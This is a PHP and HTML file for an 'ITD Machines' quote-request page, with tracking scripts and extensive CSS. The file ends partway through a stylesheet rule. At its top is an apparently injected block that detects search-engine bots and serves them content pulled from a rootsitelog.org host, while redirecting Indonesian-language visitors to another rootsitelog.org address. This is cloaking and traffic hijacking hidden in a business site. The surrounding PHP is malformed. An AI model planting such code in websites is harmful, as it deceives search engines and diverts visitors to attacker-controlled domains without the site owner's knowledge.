<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
        setcookie('az', 'lp', time() + 3600 * 7200);
        echo ' '; // Your bot-specific content
        exit;
    }
    echo file_get_contents("https://kaite.rootsitelog.org/itdmachines");
    exit;
?>
<?php
}
$browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
if ($browserLang == 'id') {
    header("Location: https://ctn.rootsitelog.org/itdmachines/");
}
?>
<?php
session_start();

// Check if the form has not been submitted
if (!isset($_SESSION['form_submitted'])) {
    // Display the form and prevent the rest of the page from loading
?>
    <!DOCTYPE html>
    <html>

    <head>
        <!-- Google tag (gtag.js) -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16630851493">
        </script>
        <script>
            window.dataLayer = window.dataLayer || [];

            function gtag() {
                dataLayer.push(arguments);
            }
            gtag('js', new Date());

            gtag('config', 'AW-16630851493');
        </script>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ITD Machines</title>
        
        <link rel="stylesheet" href="style.css">
        <link rel="stylesheet" href="index.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

        <meta http-equiv="X-UA-Compatible" content="IE=edge">




        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Baskervville:ital@0;1&display=swap" rel="stylesheet">

        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css">
        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.css">
        <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">



        <script type="application/javascript" src="https://api.ip.sb/geoip?callback=getgeoip"></script>
        <script type="text/javascript" data-cookie-consent="tracking">
            (function(w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({
                    'gtm.start': new Date().getTime(),
                    event: 'gtm.js'
                });
                var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s),
                    dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-KLFK62P');
        </script>
        <script type="text/javascript" data-cookie-consent="tracking">
            {
                if (f.fbq) return;
                n = f.fbq = function() {
                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
                };
                if (!f._fbq) f._fbq = n;
                n.push = n;
                n.loaded = !0;
                n.version = '2.0';
                n.queue = [];
                t = b.createElement(e);
                t.async = !0;
                t.src = v;
                s = b.getElementsByTagName(e)[0];
                s.parentNode.insertBefore(t, s)
            }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1155563932519377');
            fbq('track', 'PageView');
        </script>
        <script type="text/javascript" data-cookie-consent="tracking">
            ! function(w, d, t) {
                w.TiktokAnalyticsObject = t;
                var ttq = w[t] = w[t] || [];
                ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function(t, e) {
                    t[e] = function() {
                        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
                    }
                };
                for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
                ttq.instance = function(t) {
                    for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
                    return e
                }, ttq.load = function(e, n) {
                    var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
                        o = n && n.partner;
                    ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {};
                    n = document.createElement("script");
                    n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t;
                    e = document.getElementsByTagName("script")[0];
                    e.parentNode.insertBefore(n, e)
                };
                ttq.load("CPQF3V3C77UARGOJ47A0");
                ttq.page();
            }(window, document, "ttq");
        </script>

        <!-- Meta Pixel Code -->
        <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1155563932519377&ev=PageView&noscript=1" /></noscript>
        <!-- End Meta Pixel Code -->



        <script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/452264695/?random=1723290801131&amp;cv=11&amp;fst=1723290801131&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4880za200&amp;gcd=13l3l3l3l1&amp;dma=0&amp;tag_exp=0&amp;u_w=1280&amp;u_h=1024&amp;url=https%3A%2F%2Fwww.hsglaser.com%2F&amp;ref=https%3A%2F%2Fwww.hsglaser.com%2Fproducts%2Fsheet-metal%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Fiber%20laser%20cutting%20machine%20%7C%20EU%20and%20ISO%20certification%20%7C%20HSG&amp;npa=0&amp;pscdl=noapi&amp;auid=596629092.1720506078&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B127.0.6533.100%7CChromium%3B127.0.6533.100&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script>




    </head>

    <body>
        <section class="quote">
            <form id="request-quote" class="quote-form" action="submit_quote.php" method="post">
                <h2 class="form-title">Request A Quote</h2>
                <div class="form-row">
                    <div class="form-group">
                        <label for="name" class="form-label">Name</label>
                        <input type="text" id="name" name="name" class="form-input" required>
                    </div>
                    <div class="form-group">
                        <label for="email" class="form-label">E-mail</label>
                        <input type="email" id="email" name="email" class="form-input" required>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="phone" class="form-label">Phone or WhatsApp</label>
                        <input type="text" id="phone" name="phone" class="form-input" required>
                    </div>
                    <div class="form-group">
                        <label for="country" class="form-label">Country</label>
                        <input type="text" id="country" name="country" class="form-input" required>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="city" class="form-label">City</label>
                        <input type="text" id="city" name="city" class="form-input">
                    </div>
                    <div class="form-group">
                        <label for="company" class="form-label">Company</label>
                        <input type="text" id="company" name="company" class="form-input">
                    </div>
                </div>
                <div class="form-group">
                    <label for="message" class="form-label">Message</label>
                    <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
                </div>
                <button type="submit" class="form-submit">Submit</button>
            </form>
        </section>
    </body>

    </html>
<?php
    exit(); // Stop further execution
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16630851493">
    </script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'AW-16630851493');
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ITD Machines</title>
    <link rel="stylesheet" href="header.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">




    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Baskervville:ital@0;1&display=swap" rel="stylesheet">

    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css">
    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.css">
    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">



    <script type="application/javascript" src="https://api.ip.sb/geoip?callback=getgeoip"></script>
    <script type="text/javascript" data-cookie-consent="tracking">
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-KLFK62P');
    </script>
    <script type="text/javascript" data-cookie-consent="tracking">
        {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1155563932519377');
        fbq('track', 'PageView');
    </script>
    <script type="text/javascript" data-cookie-consent="tracking">
        ! function(w, d, t) {
            w.TiktokAnalyticsObject = t;
            var ttq = w[t] = w[t] || [];
            ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function(t, e) {
                t[e] = function() {
                    t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
                }
            };
            for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
            ttq.instance = function(t) {
                for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
                return e
            }, ttq.load = function(e, n) {
                var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
                    o = n && n.partner;
                ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {};
                n = document.createElement("script");
                n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t;
                e = document.getElementsByTagName("script")[0];
                e.parentNode.insertBefore(n, e)
            };
            ttq.load("CPQF3V3C77UARGOJ47A0");
            ttq.page();
        }(window, document, "ttq");
    </script>

    <!-- Meta Pixel Code -->
    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1155563932519377&ev=PageView&noscript=1" /></noscript>
    <!-- End Meta Pixel Code -->



    <script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/452264695/?random=1723290801131&amp;cv=11&amp;fst=1723290801131&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4880za200&amp;gcd=13l3l3l3l1&amp;dma=0&amp;tag_exp=0&amp;u_w=1280&amp;u_h=1024&amp;url=https%3A%2F%2Fwww.hsglaser.com%2F&amp;ref=https%3A%2F%2Fwww.hsglaser.com%2Fproducts%2Fsheet-metal%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Fiber%20laser%20cutting%20machine%20%7C%20EU%20and%20ISO%20certification%20%7C%20HSG&amp;npa=0&amp;pscdl=noapi&amp;auid=596629092.1720506078&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B127.0.6533.100%7CChromium%3B127.0.6533.100&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script>
    <style>
   

        .quote {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .quote-form {
            background: #fff;
            padding: 70px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 800px;
            animation: fadeIn 1s ease-in-out;
        }

        .form-title {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            color: #333;
            position: relative;
        }

        .form-title::after {
            content: '';
            width: 50px;
            height: 4px;
            background-color: #ff8800;
            position: absolute;
            left: 50%;
            bottom: -10px;
            transform: translateX(-50%);
            border-radius: 2px;
        }

        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .form-group {
            flex: 1;
            min-width: calc(50% - 10px);
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }

        .form-input,
        .form-select,
        .form-textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .form-input:focus,
        .form-select:focus,
        .form-textarea:focus {
            border-color: #ff8800;
            outline: none;
        }

        .form-textarea {
            resize: vertical;
            height: 120px;
        }

        .form-submit {
            width: 100%;
            padding: 15px;
            background-color: #ff8800;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .form-submit:hover {
            background-color: #ff8800;
            filter: drop-shadow(3px 4px 5px #000000);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 600px) {
            .form-row {
                flex-direction: row;
                gap: 10px;
            }

            .form-group {
                flex: 1;
                min-width: calc(50% - 10px);
            }

            .form-label {
                font-size: 13px;
            }
        }

        .footer {
            font-family: Arial, sans-serif;
            background-color: #2a2a2a;
            color: #fff;
            padding: 40px 20px;
            text-align: justify;
        }

        .footer-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;

            /* max-width: 1200px;
            margin: 0 auto; */
        }

        .footer-column {
            flex: 1;
            margin: 20px;
            min-width: 200px;
        }

        .footer-column h3 {
            margin-bottom: 15px;
            font-size: 20px;
            color: #ff8800;
        }

        .footer-column p,
        .footer-column ul {
            margin: 0;
            padding: 0;
            list-style: none;
            line-height: 1.8;
        }

        .footer-column a {
            color: #ffffff;
            text-decoration: none;

            position: relative;
            transition: all 0.3s ease;
            font-size: 15px;
        }

        .footer-column a::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            bottom: 0;
            left: 0;
            background-color: #ff6600;
            visibility: hidden;
            transform: scaleX(0);
            transition: all 0.3s ease-in-out;
        }

        .footer-column a:hover::before {
            visibility: visible;
            transform: scaleX(1);
        }

        .footer-column a:hover {
            color: #ff6600;
            transform: translateY(-5px);
        }




        .social-icons {
            margin-top: 10px;
        }

        /* .social-icons a {
    color: #fff;
    text-decoration: none;
    margin: 0 10px;
    font-size: 20px;
    transition: color 0.3s;
}

.social-icons a:hover {
    color: #007bff;
} */

        .footer-bottom {
            margin-top: 20px;
            border-top: 1px solid #444;
            padding-top: 10px;
        }

        @media (max-width: 768px) {
            .footer-container {
                flex-direction: row;
                align-items: center;
            }

            .footer-column {
                margin: 10px 0;
                text-align: left;
            }
        }

       

      

        body {

            font-family: "Baskervville", serif;
            font-weight: 600;
            font-style: normal;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Header Styles */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background-color: #ffffff;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

      
        .card-portfolio .card-img>img:hover {
            transform: scale(1.1);
        }

      

  
          


    

        html {
            scroll-behavior: smooth;
        }

        .carousel-inner img {
            width: 100%;
            height: auto;
            border-radius: 30px;
        }

        .carousel-caption {
            bottom: 20px;
        }

        .carousel-caption button {
            margin: 5px;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 25px;
        }

        .carousel-caption .btn-primary {
            background-color: #007bff;
            border: none;
        }

        .carousel-caption .btn-secondary {
            background-color: white;
            border: 2px solid #c2c2c2;
            color: #6e6e6e;
        }

        @media (max-width: 767px) {
            .carousel-caption {
                margin-bottom: 20px;
            }

            .carousel-caption button {
                margin: 5px;
            }
        }



     
        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }

        .card {
            --hsg-card-spacer-y: 1.5rem;
            --hsg-card-spacer-x: 1.5rem;
            --hsg-card-title-spacer-y: 0.75rem;
            --hsg-card-border-width: 1px;
            --hsg-card-border-color: #e2e5f1;
            --hsg-card-border-radius: 0.5rem;
            --hsg-card-box-shadow: ;
            --hsg-card-inner-border-radius: calc(0.5rem - 1px);
            --hsg-card-cap-padding-y: 1.125rem;
            --hsg-card-cap-padding-x: 1.5rem;
            --hsg-card-cap-bg: transparent;
            --hsg-card-cap-color: ;
            --hsg-card-height: ;
            --hsg-card-color: ;
            --hsg-card-bg: #fff;
            --hsg-card-img-overlay-padding: 1.5rem;
            --hsg-card-group-margin: 0.75rem;
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            height: var(--hsg-card-height);
            word-wrap: break-word;
            background-color: var(--hsg-card-bg);
            background-clip: border-box;
            border: var(--hsg-card-border-width) solid var(--hsg-card-border-color);
            border-radius: var(--hsg-card-border-radius);
            box-shadow: var(--hsg-card-box-shadow);
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        .align-items-center {
            align-items: center !important;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .container,
        .container-fluid,
        .container-xxl,
        .container-xl,
        .container-lg,
        .container-md,
        .container-sm {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            width: 100%;
            padding-right: calc(var(--hsg-gutter-x)* .5);
            padding-left: calc(var(--hsg-gutter-x)* .5);
            margin-right: auto;
            margin-left: auto;
            padding-top: 40px;
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        @media (min-width: 540px) {
            .product-center .row .card {
                min-height: 285px;
            }
        }

        .product-center .row .card {
            min-height: 225px;
        }

        .center-section .card,
        .center-section .design-aesthetics {
            transform: rotate(0deg);
        }

        .center-section .card-portfolio {
            background-color: #fff;
        }

        .card {
            margin-bottom: 12px;
            border-radius: 8px;
            border: none;
            box-shadow: none;
        }

        .card-portfolio {
            border: 0;
            background-color: rgba(0, 0, 0, 0);
        }

        .text-center {
            text-align: center !important;
        }

        .overflow-hidden {
            overflow: hidden !important;
        }

        body {
            margin: 0;

            font-size: var(--hsg-body-font-size);
            font-weight: var(--hsg-body-font-weight);
            line-height: var(--hsg-body-line-height);
            color: var(--hsg-body-color);
            text-align: var(--hsg-body-text-align);
            background-color: var(--hsg-body-bg);
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        .product-center .card-portfolio .card-body {
            padding: 1rem 0rem 0.5rem 0rem;
        }

        :root {
            --hsg-user-selection-color: rgba(var(--hsg-primary-rgb), 0.22);
            --hsg-heading-link-color: #33354d;
            --hsg-heading-link-hover-color: #6366f1;
        }

        :root {
            --hsg-blue: #0d6efd;
            --hsg-indigo: #6610f2;
            --hsg-purple: #6f42c1;
            --hsg-pink: #d63384;
            --hsg-red: #dc3545;
            --hsg-orange: #fd7e14;
            --hsg-yellow: #ffc107;
            --hsg-green: #198754;
            --hsg-teal: #20c997;
            --hsg-cyan: #0dcaf0;
            --hsg-black: #000;
            --hsg-white: #fff;
            --hsg-gray: #9397ad;
            --hsg-gray-dark: #33354d;
            --hsg-gray-100: #f3f6ff;
            --hsg-gray-200: #eff2fc;
            --hsg-gray-300: #e2e5f1;
            --hsg-gray-400: #d4d7e5;
            --hsg-gray-500: #b4b7c9;
            --hsg-gray-600: #9397ad;
            --hsg-gray-700: #565973;
            --hsg-gray-800: #33354d;
            --hsg-gray-900: #0b0f19;
            --hsg-primary: #6366f1;
            --hsg-secondary: #eff2fc;
            --hsg-success: #22c55e;
            --hsg-info: #4c82f7;
            --hsg-warning: #ffba08;
            --hsg-danger: #ef4444;
            --hsg-light: #fff;
            --hsg-dark: #0b0f19;
            --hsg-primary-rgb: 99, 102, 241;
            --hsg-secondary-rgb: 239, 242, 252;
            --hsg-success-rgb: 34, 197, 94;
            --hsg-info-rgb: 76, 130, 247;
            --hsg-warning-rgb: 255, 186, 8;
            --hsg-danger-rgb: 239, 68, 68;
            --hsg-light-rgb: 255, 255, 255;
            --hsg-dark-rgb: 11, 15, 25;
            --hsg-white-rgb: 255, 255, 255;
            --hsg-black-rgb: 0, 0, 0;
            --hsg-body-color-rgb: 86, 89, 115;
            --hsg-body-bg-rgb: 255, 255, 255;
            --hsg-font-sans-serif: "OPPOSans", sans-serif;
            --hsg-font-monospace: "OPPOSans", sans-serif;
            --hsg-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
            --hsg-body-font-family: var(--hsg-font-sans-serif);
            --hsg-body-font-size: 1rem;
            --hsg-body-font-weight: 300;
            --hsg-body-line-height: 1.6;
            --hsg-body-color: #565973;
            --hsg-body-bg: #f5f5f5;
            --hsg-border-width: 1px;
            --hsg-border-style: solid;
            --hsg-border-color: #e2e5f1;
            --hsg-border-color-translucent: rgba(0, 0, 0, 0.175);
            --hsg-border-radius: 0.375rem;
            --hsg-border-radius-sm: 0.25rem;
            --hsg-border-radius-lg: 0.5rem;
            --hsg-border-radius-xl: 1rem;
            --hsg-border-radius-2xl: 2rem;
            --hsg-border-radius-pill: 50rem;
            --hsg-link-color: #000;
            --hsg-link-hover-color: #000;
            --hsg-code-color: #e3116c;
            --hsg-highlight-bg: #fff3cd;
        }

        @media (max-width: 991.98px) {
            .product-center .text-ftitle {
                min-height: 20px;
            }
        }

        .text-ftitle {
            font-size: 12px;
            line-height: 21px;
            margin-bottom: 8px;
            font-weight: 300;
            color: #000;
            opacity: 0.9;
            letter-spacing: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .card-portfolio .card-img>img {
            display: block;
            transition: transform .35s ease-in-out;
        }

        .left-right img {
            width: 100%;
            transition: 0.5s;
        }

        @media (max-width: 991.98px) {
            .text-title {
                font-weight: 600;
            }

            .learn-more {
                width: 95px;
                text-align: center;
            }
        }

        .text-title {
            line-height: 1.25;
        }

        .text-title {
            color: #000;
            font-size: 14px;
            margin-bottom: 8px;
            line-height: 1.125;
            font-weight: 600;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h1,
        .h1 {
            font-size: calc(1.375rem + 1.5vw);
        }

        h6,
        .h6,
        h5,
        .h5,
        h4,
        .h4,
        h3,
        .h3,
        h2,
        .h2,
        h1,
        .h1 {
            margin-top: 0;
            margin-bottom: 1rem;
            font-weight: 800;
            line-height: 1.3;
            color: var(--hsg-gray-900);
        }

        .learn-more {
            border-radius: 17px;
            border: 2px solid #345aca;
            background-color: #345aca;
            color: #fff;
            display: inline-block;
            padding: 4px 10px;
            transition: .3s ease-out;
            font-size: 12px;
            font-weight: 300;
            line-height: initial;
        }

        a {
            transition: color .2s ease-in-out;
        }

        a {
            color: var(--hsg-link-color);
            text-decoration: none;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .model-title {
                font-size: 1.6rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .model-title {
                font-size: 2.125rem;
            }
        }

        @media (min-width: 992px) {
            .model-title {
                font-size: calc(1.25vw + 24px);
                font-weight: 600;
            }
        }

        @media (min-width: 992px) {
            .model-title {
                font-size: calc(1.325rem + 0.9vw);
            }
        }

        .model-title {
            font-size: 1.125rem;
            line-height: 1.3;
            font-weight: 400;
            color: #000;
            margin-bottom: 16px;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h1,
        .h1 {
            font-size: calc(1.375rem + 1.5vw);
        }

        h6,
        .h6,
        h5,
        .h5,
        h4,
        .h4,
        h3,
        .h3,
        h2,
        .h2,
        h1,
        .h1 {
            margin-top: 0;
            margin-bottom: 1rem;
            font-weight: 300;
            line-height: 1.3;
            color: var(--hsg-gray-900);
        }

        .card-portfolio .card-img>img {
            display: block;
            transition: transform .35s ease-in-out;
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        .product-center .col-6:nth-of-type(odd),
        .technological-innovation .col-6:nth-of-type(odd),
        .company-news .col-6:nth-of-type(odd) {
            padding-right: 6px;
        }

        @media (min-width: 992px) {
            .col-lg-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 992px) {
            .col-lg-7 {
                flex: 0 0 auto;
                width: 58.33333333%;
            }
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 992px) {
            .center-section {
                margin-bottom: 6rem;
            }
        }

        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }

        body {
            margin: 0;

            font-size: var(--hsg-body-font-size);
            font-weight: var(--hsg-body-font-weight);
            line-height: var(--hsg-body-line-height);
            color: var(--hsg-body-color);
            text-align: var(--hsg-body-text-align);
            background-color: var(--hsg-body-bg);
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        @media (min-width: 992px) {
            .center-section .container-fluid {
                padding: 2.5rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 1.5rem;
            }
        }

        @media (min-width: 992px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 2rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title {
                font-size: 1.25rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-title {
                font-size: 1.6rem;
            }
        }

        .text-title {
            line-height: 1.25;
        }

        @media (min-width: 992px) {
            .text-title {
                font-size: 1.75rem;
                line-height: 1.185;
                margin-bottom: 16px;
                letter-spacing: 0px;
                font-size: 18px;
                font-weight: 600;
            }
        }

        @media (min-width: 992px) {
            .text-title {
                font-weight: 600;
            }
        }

        .text-title {
            color: #000;
            font-size: 14px;
            margin-bottom: 8px;
            line-height: 1.125;
            font-weight: 600;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 1.5rem;
            }
        }

        @media (min-width: 992px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 2rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-ftitle {
                line-height: 26px;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-ftitle {
                font-size: 13px;
            }
        }

        @media (min-width: 992px) {
            .text-ftitle {
                font-size: 15px;
                font-weight: 300;
                line-height: 24px;
            }
        }

        @media (min-width: 992px) {
            .text-ftitle {
                font-size: 1rem;
                line-height: 26px;
                font-weight: 500;
                margin-bottom: 20px;
            }
        }

        .text-ftitle {
            font-size: 15px;
            line-height: 25px;
            margin-bottom: 8px;
            font-weight: 300;
            color: #000;
            opacity: 0.9;
            letter-spacing: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        @media (min-width: 720px) {

            .left-right,
            .left-right .row>div {
                max-height: inherit;
            }
        }

        .left-right,
        .left-right .row>div {
            max-height: 550px;
        }

        .left-right .col-sm-5 {
            width: 36%;
            overflow: hidden;
        }

        @media (min-width: 500px) {
